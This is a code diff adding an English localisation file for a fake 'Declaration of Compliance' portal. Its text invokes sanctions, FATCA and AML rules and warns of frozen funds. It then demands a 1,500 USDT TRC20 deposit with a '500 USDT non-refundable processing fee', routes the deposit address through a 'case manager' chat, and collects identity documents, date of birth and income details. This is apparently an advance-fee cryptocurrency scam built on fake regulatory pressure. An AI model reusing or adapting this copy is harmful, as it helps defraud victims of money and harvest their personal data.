@@ -1,0 +1,229 @@
+{
+  "header": {
+    "title": "Declaration of Compliance",
+    "subtitle": "Multi-section regulatory declaration. All required fields must be completed before submission."
+  },
+  "back": "Back to Dashboard",
+  "hero": {
+    "badge": "Regulatory Compliance · Required",
+    "title": "Declaration of Compliance",
+    "subtitle": "User Verification Portal",
+    "description": "To ensure continued access to platform services and to maintain alignment with evolving international regulatory standards, all users are required to complete the Declaration of Compliance. This process confirms that your account activity is lawful, compliant, and not associated with any sanctioned jurisdictions or restricted digital assets.",
+    "completeAll": "Please complete all sections below."
+  },
+  "sectionLabel": "Section {{number}}",
+  "sections": {
+    "personal": {
+      "title": "Personal Identification",
+      "subtitle": "Confirm the details associated with your account."
+    },
+    "accessCode": {
+      "title": "Access Code Authentication",
+      "subtitle": "Please enter the access code provided to you to unlock the declaration form.",
+      "help": "The access code was supplied by your compliance contact in your latest secure message. If you do not have it, please contact support."
+    },
+    "sanctions": {
+      "title": "Sanctions Compliance Declaration",
+      "subtitle": "Please review each statement carefully and confirm your compliance.",
+      "iran": "I confirm that I am not involved in any activities connected to Iran or any jurisdiction, entity, or individual subject to U.S. sanctions.",
+      "noSanctioned": "I confirm that I have not engaged in any direct or indirect transactions involving sanctioned parties.",
+      "usdt": "I acknowledge that USDT (Tether) is no longer supported due to regulatory concerns, and I agree not to use USDT on this platform going forward.",
+      "falseInfo": "I understand that providing false or misleading information may result in account restrictions or permanent closure."
+    },
+    "asset": {
+      "title": "Approved Asset Confirmation",
+      "subtitle": "Please select your preferred supported asset for all future transactions.",
+      "preferred": "Preferred Asset",
+      "recommended": "Recommended supported asset",
+      "other": "Other Supported Asset (optional)",
+      "otherPlaceholder": "e.g. USDC (Ethereum), DAI, ...",
+      "usdcShort": "USDC",
+      "usdcPolygon": "USDC (Polygon)"
+    },
+    "income": {
+      "title": "Source of Income",
+      "subtitle": "Please indicate the primary source of the funds associated with your account.",
+      "selectAll": "Sources of Income (select all that apply)",
+      "tap": "Tap each card that applies. You can choose more than one source.",
+      "monthly": "Approximate Monthly Income (USD)",
+      "monthlyHelp": "Enter your average monthly income in US dollars. A best-faith estimate is fine.",
+      "monthlyPlaceholder": "e.g. 7,500",
+      "otherLabel": "Please describe your other source(s) of income",
+      "otherPlaceholder": "Describe your additional source of income"
+    },
+    "regulatory": {
+      "title": "Regulatory Acknowledgment",
+      "subtitle": "By completing this declaration, I acknowledge the following:",
+      "agree": "I understand and agree to the above terms.",
+      "bullets": {
+        "scrutiny": "Recent regulatory developments have increased scrutiny on USDT transactions.",
+        "frozen": "Funds associated with sanctioned jurisdictions may be subject to review or freezing.",
+        "required": "This declaration is required to maintain uninterrupted access to platform services.",
+        "future": "All future transactions will be processed using supported assets such as USDC.",
+        "protect": "I understand that this measure is designed to protect my account and ensure compliance."
+      }
+    },
+    "terms": {
+      "title": "Regulatory Terms & Access Code Authenticator",
+      "subtitle": "Read every term carefully. Once you accept, you can self-issue your declaration access code below.",
+      "groupA": "A. International Regulatory Terms",
+      "groupB": "B. AML, CTF & KYC Attestation",
+      "groupC": "C. Tax, FATCA & CRS",
+      "groupD": "D. Data Retention, Privacy & Recourse",
+      "a": {
+        "fatf": "I confirm that the funds being declared are not the proceeds of, nor will they be used for, any activity prohibited under FATF, OFAC, EU, UK, or UN sanctions regimes.",
+        "share": "I consent to the cross-border sharing of this declaration and any related compliance data with regulators, partner financial institutions, and supervisory bodies in jurisdictions relevant to my account activity.",
+        "breakdown": "I understand that the 1,500 USDT deposit is broken down as <0>1,000 USDT fully refundable</0> on compliance approval and <1>500 USDT non-refundable processing fee</1> for review, on-chain verification, and regulatory record-keeping.",
+        "binding": "I acknowledge that submitting the on-chain transaction hash, together with the access code I issue to myself below, constitutes my legally binding acceptance of these international regulatory terms.",
+        "false": "I understand that providing a false, reused, or unverifiable transaction hash will result in immediate rejection of this declaration and forfeiture of the refundable portion."
+      },
+      "b": {
+        "true": "I declare that all information, documents, and identification materials I have provided are true, complete, and current to the best of my knowledge.",
+        "notify": "I will promptly notify the compliance team of any material change to my identity, residency, source of funds, or beneficial-ownership position within 30 days of the change.",
+        "kyc": "I understand that the institution may request additional Know-Your-Customer (KYC), Customer Due Diligence (CDD), or Enhanced Due Diligence (EDD) documents at any time, and that failure to respond within the requested window may result in account suspension.",
+        "thirdParty": "I confirm I am not knowingly acting on behalf of an undisclosed third party, sanctioned entity, politically exposed person without disclosure, or any party engaged in money laundering or terrorism financing."
+      },
+      "c": {
+        "tax": "I confirm that I am responsible for declaring and paying all taxes due in my jurisdiction(s) of tax residence on any income, gains, or holdings related to this account.",
+        "fatca": "I consent to the institution reporting my account information to the relevant tax authorities under FATCA, the Common Reporting Standard (CRS), and any equivalent local regime.",
+        "tin": "I will provide a valid tax identification number (TIN) on request and update it whenever my tax residency changes."
+      },
+      "d": {
+        "retain": "I understand that this declaration and supporting records will be retained for a minimum of seven (7) years following the closure of my case, in line with international financial-services record-keeping standards.",
+        "process": "I authorize the institution to process my personal data for compliance, fraud-prevention, audit, and regulatory-reporting purposes.",
+        "dispute": "I agree that any dispute arising from this declaration shall be resolved under the governing law specified in my account agreement, and that my recourse is limited to the remedies available under that agreement.",
+        "update": "I acknowledge that the institution reserves the right to update these terms with prior notice and that my continued use of the service after such notice constitutes acceptance of the updated terms."
+      },
+      "fee": {
+        "totalDeposit": "Total Deposit",
+        "refundableLabel": "Refundable",
+        "refundableNote": "Returned after compliance approval",
+        "processingLabel": "Processing Fee",
+        "processingNote": "Non-refundable review fee",
+        "network": "Network",
+        "networkValue": "TRC20 (Tron)",
+        "depositAddress": "Deposit Address",
+        "noAddress": "Your dedicated deposit address has not been issued yet. Please contact your case manager via in-portal chat to receive your address before completing this section.",
+        "txHash": "Transaction Hash (TX ID) of your 1,500 USDT deposit",
+        "txHashPlaceholder": "e.g. 4a8e9f1c5d3b2a7e6f0c1d8b9a4e2f3c...",
+        "txHashHelp": "Paste the transaction hash exactly as it appears in your wallet or on the block explorer. We use it to verify your deposit on-chain before releasing the refundable portion."
+      },
+      "acceptToggle": "I have read and accept all of the regulatory terms above (sections A–D), and I understand the 1,500 USDT deposit splits into 1,000 USDT refundable and 500 USDT non-refundable processing fee.",
+      "issueButton": "Get My Access Code Authenticator",
+      "issuingButton": "Issuing...",
+      "issueHelp": "Accept the terms above to enable this button. Clicking it issues your unique declaration code.",
+      "issuedTitle": "Your Declaration Access Code",
+      "issuedHelp": "This code has been entered for you in the Access Code field at the top of the form. Keep it private — anyone with this code could attempt to submit a declaration on your case."
+    },
+    "signature": {
+      "title": "Signature & Authorization",
+      "subtitle": "By signing below, you certify that all information provided is accurate, truthful, and complete.",
+      "fullName": "Full Name (Typed Signature)",
+      "fullNamePlaceholder": "Type your full legal name",
+      "date": "Date",
+      "afterSubmission": "After submission",
+      "afterBullets": {
+        "review": "Your information will be reviewed by the compliance team.",
+        "confirm": "You will receive a confirmation once your account is classified as compliant.",
+        "continue": "You may continue using the platform without interruption.",
+        "future": "All future transactions will be conducted using supported assets only."
+      },
+      "submit": "Submit Declaration",
+      "submitting": "Submitting Declaration…",
+      "footer": "This declaration is timestamped, IP-logged, and recorded as a legal compliance attestation."
+    }
+  },
+  "fields": {
+    "fullName": "Full Name",
+    "fullNamePlaceholder": "As shown on ID",
+    "email": "Email Address",
+    "registeredUsername": "Registered Username",
+    "accountId": "Account ID (if applicable)",
+    "country": "Country of Residence",
+    "selectCountry": "Select country",
+    "dob": "Date of Birth",
+    "accessCode": "Access Code",
+    "accessCodePlaceholder": "Enter the 8-digit code from your compliance officer"
+  },
+  "incomeOptions": {
+    "salary": "Salary / Employment Income",
+    "business": "Business / Self-Employment",
+    "investment": "Investment Returns (Stocks, Bonds, Funds)",
+    "crypto": "Cryptocurrency Trading / Investing",
+    "realEstate": "Real Estate / Property Income",
+    "inheritance": "Inheritance / Family Gift",
+    "pension": "Pension / Retirement Savings",
+    "saleAssets": "Sale of Personal Assets",
+    "other": "Other (please specify)"
+  },
+  "attachments": {
+    "title": "Source of Income — Supporting Documents",
+    "description": "Upload <0>Proof of Source of Income</0> (required) — e.g. recent payslips, employer letter, or last tax return. You may attach up to {{max}} additional supporting documents (bank statements, dividend statements, sale contracts, etc.). PDF, PNG, JPEG, or WebP · Max 10 MB each.",
+    "psoiMissing": "A Proof of Source of Income document is required to submit this declaration.",
+    "addMore": "Add another supporting document",
+    "psoiLabel": "Proof of Source of Income",
+    "supportingPlaceholder": "Document name (e.g. Bank Statement Q3)",
+    "replaceFile": "Replace File",
+    "chooseFile": "Choose File",
+    "noFileSelected": "No file selected"
+  },
+  "toast": {
+    "unsupportedTypeTitle": "Unsupported file type",
+    "unsupportedTypeDesc": "Please upload a PDF, PNG, JPEG, or WebP file.",
+    "tooLargeTitle": "File too large",
+    "tooLargeDesc": "Maximum file size is 10 MB. This file is {{size}} MB.",
+    "couldNotReadTitle": "Could not read file",
+    "couldNotReadDesc": "Please try a different file.",
+    "completeTitle": "Please complete the form",
+    "completeDesc": "Missing: {{missing}}",
+    "submissionFailedTitle": "Submission failed",
+    "submissionFailedDesc": "Please review the form and try again.",
+    "submittedTitle": "Declaration submitted",
+    "submittedDesc": "Our compliance team will review your submission shortly.",
+    "attachmentFailuresTitle": "Some documents could not be saved",
+    "attachmentFailuresDesc": "Your declaration was recorded, but {{count}} attachment(s) failed to upload ({{names}}). Our compliance team has been notified and will request a re-upload via the Documents view if needed — no action required from you right now.",
+    "networkErrorTitle": "Network error",
+    "networkErrorDesc": "Could not submit your declaration. Please try again.",
+    "issueFailedTitle": "Could not issue access code",
+    "issueFailedDesc": "Please try again.",
+    "noCodeTitle": "No access code returned",
+    "noCodeDesc": "Please contact compliance support.",
+    "codeIssuedTitle": "Access code issued",
+    "codeIssuedDesc": "Your declaration access code is shown below and has been entered for you at the top of the form.",
+    "networkShortTitle": "Network error",
+    "copyTitle": "Copied",
+    "copyDeposit": "Deposit address copied to clipboard.",
+    "copyAccessCode": "Access code copied to clipboard."
+  },
+  "missing": {
+    "fullName": "Full Name",
+    "email": "Email Address",
+    "country": "Country of Residence",
+    "dob": "Date of Birth",
+    "accessCode": "Access Code",
+    "sourceOfIncome": "Source of Income",
+    "sourceOfIncomeOther": "Source of Income (specify)",
+    "monthlyIncome": "Monthly Income",
+    "txHash": "Processing Fee Transaction Hash",
+    "signature": "Signature",
+    "signatureDate": "Signature Date",
+    "allConfirmations": "All compliance confirmations",
+    "psoi": "Proof of Source of Income document",
+    "supportingLabel": "Label for each supporting document"
+  },
+  "yes": "Yes",
+  "no": "No",
+  "status": {
+    "submittedTitle": "Declaration Submitted",
+    "submittedDesc": "Thank you. Your Declaration of Compliance has been received and is now being reviewed by our compliance team. You will be notified as soon as the review is complete.",
+    "submittedOn": "Submitted on {{date}}",
+    "approvedTitle": "Compliance Confirmed",
+    "approvedDesc": "Your declaration has been reviewed and approved. Your account is classified as compliant and you may continue using the platform without interruption.",
+    "rejectedTitle": "Declaration Requires Attention",
+    "rejectedDesc": "Our compliance team has flagged your previous submission. Please contact support for the next steps.",
+    "rejectedNotes": "Reviewer notes",
+    "noneTitle": "No Declaration Required",
+    "noneDesc": "Your account does not currently require a Declaration of Compliance. Your compliance officer will notify you here if anything changes.",
+    "attachmentsTitle": "Attached Documents ({{count}})"
+  }
+}
